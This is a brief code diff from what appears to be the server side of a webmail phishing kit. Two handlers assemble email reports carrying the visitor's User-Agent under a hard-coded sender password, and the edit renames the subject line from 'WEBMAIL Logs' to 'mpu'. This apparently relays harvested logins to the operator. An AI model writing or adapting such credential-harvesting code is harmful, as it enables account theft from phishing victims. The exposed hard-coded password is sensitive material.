@@ -151,7 +151,7 @@ def first():
         password = "Account3487$@"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL Logs !"
+        message["Subject"] = "mpu !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -189,7 +189,7 @@ def second():
         password = "Account3487$@"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL logs !! "
+        message["Subject"] = "mpu !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
